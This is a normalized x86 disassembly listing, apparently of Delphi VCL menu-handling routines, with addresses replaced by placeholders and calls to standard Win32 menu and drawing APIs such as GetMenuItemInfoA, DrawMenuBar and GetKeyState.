mov edx ebx
mov eax esi
call sub_453acc
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_453acc
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_453acc
call sub_454b54
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_454cd0
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_454cd0
and eax 0x7f
mov al [ eax + rw-data ]
sub_454cfc
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_454cfc
and eax 0x7f
mov al [ eax + rw-data ]
sub_454d28
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_451b50
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_41e1a4
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_455a54
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_454dc4
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_4036c0
mov eax [ esi + 0x44 ]
call sub_4036c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41e1f0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_454e38
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_454e38
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_4516bc
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_453ec0
mov eax ebx
pop esi
pop ebx
retn
sub_454e78
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_453abc
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_453acc
call sub_454e78
pop ecx
test al al
je r-xdata
sub_454f10
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_454e78
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_4516bc
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_454f40
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_454f10
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_456264
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_454fb0
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_454f10
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_454fcc
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_454f10
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_45467c
mov ebx eax
xor edx edx
mov eax edi
call sub_454b78
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_453fe4
mov eax [ esi + 0x34 ]
call sub_453fe4
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_452054
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_448484
push eax
call DrawMenuBar
sub_4550b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_4550b8
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_4551dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_454f10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_453fe4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_4550a8
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_45520c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_428d78
xor eax eax
push ebp
push sub_45530a
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_428d78
xor eax eax
push ebp
push sub_4552df
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4550b8
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_428d70
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455311
mov eax [ rw-data ]
call sub_428d70
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_454f10
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_455330
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_4556b4
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_4556b4
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_4553ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_455988
mov eax ebx
call sub_408fa8
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_45548c
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_4553ec
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_404694
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_4048dc
lea edx [ ebp - 0x200 ]
call sub_409098
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_455520
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_455590
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_455a30
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_455a30
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_455a30
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_45559c
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_45548c
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_455520
mov eax ebx
call sub_455a54
jmp r-xdata
sub_455604
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_45564c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_44fc00
mov eax ebx
call sub_454e60
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_44fc44
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_41e274
sub_455688
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41e4c0
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_45564c
sub_4556cc
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_454f10
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_454f10
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_45925c
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_455728
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_4557fd
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_454f10
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_454f10
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_453abc
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_453acc
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_40460c
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_40460c
mov eax [ ebp - 0xc ]
pop edx
call sub_408800
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_456578
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455804
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_404450
retn
sub_455810
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_4556cc
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_455728
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_455988
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_455094
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_454f10
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_454f10
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_409078
mov eax [ ebp + 0x10 ]
call sub_408f90
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_455a54
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_43ec78
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_455a30
mov [ ebx + 0x41 ] 0x1
sub_455a7c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403870
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_455a30
mov [ ebx + 0x41 ] 0x1
sub_455b08
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_455604
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_45548c
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_455b98
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_455bd4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_455bfe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_455c20
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_456153
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45615a
lea eax [ ebp - 0x30 ]
call sub_40442c
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4161a0
mov edx [ esi + 0x4 ]
call sub_454fcc
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_46270c
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4161a0
mov dx [ esi + 0x4 ]
call sub_454fb0
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_421e30
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_455f86
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_455f69
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_422568
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_422408
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4563f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455f70
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_422568
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
